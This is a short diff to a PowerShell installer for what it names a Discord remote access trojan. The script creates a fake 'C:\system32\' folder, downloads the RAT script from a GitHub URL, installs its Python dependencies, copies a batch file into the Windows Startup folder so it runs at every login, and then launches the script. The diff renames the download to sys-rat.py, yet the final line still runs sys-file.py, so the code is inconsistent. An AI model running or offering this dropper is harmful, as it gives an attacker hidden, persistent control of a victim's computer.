@@ -2,7 +2,7 @@ mkdir 'C:\system32\'
 
 cd C:\system32\
 
-iwr -Uri https://raw.githubusercontent.com/simen64/Simple-discord-RAT/main/Simple-Discord-RAT.py -OutFile C:\system32\sys-file.py
+iwr -Uri https://raw.githubusercontent.com/simen64/Simple-discord-RAT/main/Simple-Discord-RAT.py -OutFile C:\system32\sys-rat.py
 
 py -m pip install discord.py requests
 
@@ -11,5 +11,3 @@ py -m pip install discord.py requests
 Copy-Item 'C:\system32\startup.bat' "$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 Python sys-file.py $dc
-
-pause
